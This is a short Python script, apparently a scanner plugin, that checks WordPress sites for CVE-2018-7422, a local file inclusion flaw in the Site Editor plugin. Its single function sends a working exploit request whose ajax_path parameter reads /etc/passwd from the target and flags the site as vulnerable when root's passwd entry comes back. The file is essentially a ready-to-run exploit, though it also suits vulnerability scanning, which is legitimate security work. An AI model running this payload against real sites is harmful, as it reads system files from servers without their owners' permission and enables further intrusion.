import re
import requests
import urllib


def verify(url):
    relsult = {
        'name': 'CVE-2018-7422 WordPress Site Editor < 1.1.1 Local File Inclusion(LFI)',
        'vulnerable': False,
        'attack': False,
    }

    payload = '/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd'
    targetUrl = urllib.parse.urljoin(url, payload)
    try:
        res = requests.get(targetUrl, timeout=3, verify=False)
        if re.search('root:x:0:0', res.text) and re.search('"success":true', res.text):
            relsult['vulnerable'] = True
            relsult['url'] = url
            relsult['verify'] = targetUrl
            relsult['about'] = 'https://blog.csdn.net/weixin_47311099/article/details/122854894, http://cve.scap.org.cn/vuln/VH-CVE-2018-7422'
            return relsult
        else:
            return relsult
    except:
        return relsult
